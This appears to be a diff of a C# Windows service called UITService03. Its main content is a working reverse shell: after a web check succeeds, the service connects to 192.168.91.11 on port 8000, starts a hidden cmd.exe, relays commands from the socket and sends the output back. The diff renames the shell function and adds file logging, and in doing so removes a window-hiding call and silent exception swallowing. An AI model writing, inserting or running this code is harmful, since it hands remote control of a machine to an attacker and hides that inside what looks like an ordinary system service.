@@ -12,11 +12,14 @@ using System.Threading.Tasks;
 using System.Timers;
 using System.Net.Sockets;
 using System.Runtime.InteropServices;
-
+using System.Threading;
+using System.Collections;
 namespace UITService03
 {
     public partial class Service1 : ServiceBase
     {
+
+        static StreamWriter streamWriter;
         public Service1()
         {
             InitializeComponent();
@@ -53,68 +56,74 @@ namespace UITService03
             {
                 if (rsp.StatusCode.ToString()=="OK")
                 {
-                    reverve();
+                    WriteToFile("checkkk OK");
+                    Action();
+                }
+
+            }
+        }
+
+        public void WriteToFile(string Message)
+        {
+            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
+            if (!Directory.Exists(path))
+            {
+                Directory.CreateDirectory(path);
+            }
+            string filepath = AppDomain.CurrentDomain.BaseDirectory +
+            "\\Logs\\ServiceLog_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') +
+            ".txt";
+            if (!File.Exists(filepath))
+            {
+                using (StreamWriter sw = File.CreateText(filepath))
+                {
+                    sw.WriteLine(Message);
+                }
+            }
+            else
+            {
+                using (StreamWriter sw = File.AppendText(filepath))
+                {
+                    sw.WriteLine(Message);
                 }
             }
         }
-        [DllImport("kernel32.dll")]
-        static extern IntPtr GetConsoleWindow();
 
-        [DllImport("user32.dll")]
-        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
-        const int SW_HIDE = 0;
-        const int SW_SHOW = 5;
 
-        static StreamWriter streamWriter;
-
-        public static void reverve()
+        public static void Action()
         {
-            var handle = GetConsoleWindow();
-
-            // Hide
-            ShowWindow(handle, SW_HIDE);
-
-            try
+            using (TcpClient client = new TcpClient("192.168.91.11", 8000))
             {
-                using (TcpClient client = new TcpClient("192.168.91.11", 443))
+                using (Stream stream = client.GetStream())
                 {
-                    using (Stream stream = client.GetStream())
+                    using (StreamReader rdr = new StreamReader(stream))
                     {
-                        using (StreamReader rdr = new StreamReader(stream))
+                        streamWriter = new StreamWriter(stream);
+
+                        StringBuilder strInput = new StringBuilder();
+
+                        Process p = new Process();
+                        p.StartInfo.FileName = "cmd.exe";
+                        p.StartInfo.CreateNoWindow = true;
+                        p.StartInfo.UseShellExecute = false;
+                        p.StartInfo.RedirectStandardOutput = true;
+                        p.StartInfo.RedirectStandardInput = true;
+                        p.StartInfo.RedirectStandardError = true;
+                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+                        p.Start();
+                        p.BeginOutputReadLine();
+
+                        while (true)
                         {
-                            streamWriter = new StreamWriter(stream);
-
-                            StringBuilder strInput = new StringBuilder();
-
-                            Process p = new Process();
-                            p.StartInfo.FileName = "cmd.exe";
-                            p.StartInfo.CreateNoWindow = true;
-                            p.StartInfo.UseShellExecute = false;
-                            p.StartInfo.RedirectStandardOutput = true;
-                            p.StartInfo.RedirectStandardInput = true;
-                            p.StartInfo.RedirectStandardError = true;
-                            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
-                            p.Start();
-                            p.BeginOutputReadLine();
-
-                            while (true)
-                            {
-                                strInput.Append(rdr.ReadLine());
-                                //strInput.Append("\n");
-                                p.StandardInput.WriteLine(strInput);
-                                strInput.Remove(0, strInput.Length);
-                            }
+                            strInput.Append(rdr.ReadLine());
+                            p.StandardInput.WriteLine(strInput);
+                            strInput.Remove(0, strInput.Length);
                         }
                     }
                 }
             }
-            catch (Exception ex)
-            {
-                // silence is golden
-            }
         }
-
         private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
         {
             StringBuilder strOutput = new StringBuilder();
@@ -127,13 +136,9 @@ namespace UITService03
                     streamWriter.WriteLine(strOutput);
                     streamWriter.Flush();
                 }
-                catch (Exception ex)
-                {
-                    // silence is golden
-                }
+                catch (Exception err) { }
             }
         }
-    
 
-}
+    }
 }
